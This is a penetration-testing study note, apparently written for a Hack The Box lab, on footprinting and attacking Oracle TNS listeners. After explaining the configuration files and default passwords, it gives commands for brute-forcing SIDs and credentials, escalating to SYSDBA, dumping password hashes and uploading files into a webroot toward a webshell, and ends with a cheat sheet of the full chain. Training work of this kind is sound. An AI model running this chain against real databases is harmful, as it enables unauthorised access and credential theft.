# Oracle TNS (1521)

---

## Overview

`Oracle Transparent Network Substrate` (`TNS`) is a communication protocol facilitating **Oracle database ↔ application** communication over networks. Introduced as part of the **Oracle Net Services** suite; supports multiple protocol stacks (TCP/IP, IPX/SPX).

- Preferred solution for large, complex databases → healthcare, finance, retail industries.
- Built-in encryption mechanism; updated over time for IPv6 and SSL/TLS.
- Adds an encryption layer over the TCP/IP protocol layer to protect traffic from unauthorized access/attacks.

|**Purpose**|**What it covers**|
|---|---|
|Name resolution|Service names → network addresses|
|Connection management|Client ↔ listener handling|
|Load balancing|Distributing connections|
|Security|Encrypted client-server communication|

Plus admin tooling: performance monitoring/analysis, error reporting & logging, workload management, fault tolerance via database services.

## Default Configuration

Varies by Oracle version/edition, but commonly:

- Listener listens on **TCP/1521** (changeable during install or via config file).
- Supports TCP/IP, UDP, IPX/SPX, AppleTalk; can listen on specific IPs or all interfaces.
- **Remote management**: enabled in Oracle 8i/9i, **disabled** in Oracle 10g/11g.
- Basic security: accepts connections only from authorized hosts; basic auth combining hostnames, IPs, usernames/passwords; encrypts communication via Oracle Net Services.

#### Config Files

Located in `$ORACLE_HOME/network/admin` — plain text files describing instances and network services using TNS:

- **`tnsnames.ora`** *(client-side)* — resolves service names to network addresses. Each entry = service name + network location + service/database name to connect to. Can also hold authentication details, connection pooling, load balancing configs.

```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

- **`listener.ora`** *(server-side)* — defines the listener process's properties; the listener receives incoming client requests and forwards them to the right database instance.

```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

> [!tip] Division of labor
> Client-side Oracle Net Services uses `tnsnames.ora` to resolve **service names → addresses**; the listener process uses `listener.ora` to know **which services to listen for** and how to behave.

#### Key tnsnames.ora Settings

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|Descriptor providing a name for the database and its connection type.|
|`ADDRESS`|Network address of the database (hostname + port number).|
|`PROTOCOL`|Network protocol used for communication with the server.|
|`PORT`|Port number used for communication.|
|`CONNECT_DATA`|Connection attributes: service name or SID, protocol, database instance identifier.|
|`INSTANCE_NAME`|Name of the database instance the client wants to connect to.|
|`SERVICE_NAME`|Name of the service the client wants to connect to.|
|`SERVER`|Server type for the connection (dedicated or shared).|
|`USER` / `PASSWORD`|Credentials for authenticating with the database server.|
|`SECURITY`|Type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|SSL/TLS version for the connection.|
|`CONNECT_TIMEOUT` / `RECEIVE_TIMEOUT` / `SEND_TIMEOUT`|Time limits (seconds) for establishing connection / receiving response / sending request.|
|`SQLNET.EXPIRE_TIME`|Time limit (seconds) to detect a failed connection.|
|`TRACE_LEVEL` / `TRACE_DIRECTORY` / `TRACE_FILE_NAME`|Tracing level and trace file location/name.|
|`LOG_FILE`|File where log information is stored.|

#### Protection & Default Credentials

- **PL/SQL Exclusion List** (`PlsqlExclusionList`) — user-created text file placed in `$ORACLE_HOME/sqldeveloper`; blacklist of PL/SQL packages/types excluded from execution (not accessible via Oracle Application Server).
- ⚠️ Default passwords worth remembering:
	- Oracle 9 → `CHANGE_ON_INSTALL`
	- Oracle 10 → no default password set
	- Oracle DBSNMP service → `dbsnmp`
- Many orgs still run the legacy **finger** service alongside Oracle — knowing a home directory can put the service at risk.

TNS is typically found alongside: Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, etc.

## Footprinting the Service

Tooling: `odat` (Oracle Database Attacking Tool — enumerate & exploit SQLi, RCE, privesc), `sqlplus`, nmap/hydra for SID guessing.

#### ODAT Setup (condensed)

```
sudo apt-get install -y build-essential python3-dev libaio1
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz && cd cx_Oracle-8.3.0
sudo python3 setup.py install
git clone https://github.com/quentinhardy/odat.git && cd odat/
pip install python-libnmap && git submodule init && git submodule update
pip3 install colorlog termcolor passlib python-libnmap pycryptodome openpyxl
sudo apt-get install python3-scapy build-essential libgmp-dev -y
./odat.py -h   # verify installation
```

#### Nmap — Identify Listener

```
tylapcheong@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

1521/tcp open  oracle-tns  Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

#### SIDs

A **System Identifier (`SID`)** uniquely identifies a database instance (processes + memory structures managing the data). Clients specify the SID in their connection string; if omitted, the default from `tnsnames.ora` applies. Wrong SID = failed connection. Admins use SIDs to start/stop/restart instances, adjust memory/config, monitor via Enterprise Manager.

Bruteforce SIDs with nmap, hydra, or odat:

```
tylapcheong@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

| oracle-sid-brute:
|_  XE
```

#### ODAT All Modules

Runs every module: retrieves DB names, versions, running processes, user accounts, vulnerabilities, misconfigurations — including credential guessing (locked accounts skipped automatically):

```
tylapcheong@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Valid credentials found: scott/tiger. Continue...
```

(`scott`/`tiger` is the classic default Oracle pair.)

## Interacting with sqlplus

#### Setup

```
tylapcheong@htb[/htb]$ sudo apt update && sudo apt upgrade parrot-core
tylapcheong@htb[/htb]$ sudo apt install oracle-instantclient-sqlplus
tylapcheong@htb[/htb]$ sqlplus -v
```

If you hit `sqlplus: error while loading shared libraries: libsqlplus.so`:

```
tylapcheong@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
```

#### Log In & Enumerate

```
tylapcheong@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
```

Useful queries:

```
SQL> select table_name from all_tables;
SQL> select * from user_role_privs;    -- e.g. SCOTT has only CONNECT + RESOURCE (no admin)
```

#### Privilege Escalation to SYSDBA

Works when the low-priv user was granted appropriate privileges (often by careless DBAs):

```
tylapcheong@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL> select * from user_role_privs;    -- now shows SYS with DBA, DATAPUMP_*, CTXAPP, ...
```

#### Extract Password Hashes

With sysdba access, pull hashes for offline cracking (note: read-only in this state — no new users/modifications):

```
SQL> select name, password from sys.user$;

SYS      FBA343E7D6C8BC9D
SYSTEM   B5073FE1DE351687
OUTLN    4A3BA55E08595C81
```

## File Upload via ODAT (utlfile)

Web shell delivery requires a running web server + knowledge of its root directory. Default paths:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

> [!warning] Test with benign files first
> Always upload an innocuous test file first — don't trip AV/IDS with something that looks dangerous immediately.

```
tylapcheong@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
tylapcheong@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Verify the upload landed in a web-accessible location:

```
tylapcheong@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
```

## Workflow Cheat Sheet

1. Nmap `-p1521 -sV` → TNS listener version (e.g. `11.2.0.2.0`)
2. Bruteforce SIDs → `nmap --script oracle-sid-brute` (or `odat sidguesser`)
3. Full enumeration + credential guessing → `odat.py all -s <IP>` (watch for `scott/tiger`)
4. Connect: `sqlplus <user>/<pass>@<IP>/<SID>` → `all_tables`, `user_role_privs`
5. Try `as sysdba` escalation → extract hashes from `sys.user$` → crack offline
6. If a web server exists: `odat.py utlfile --putFile` into the webroot → confirm via curl → webshell
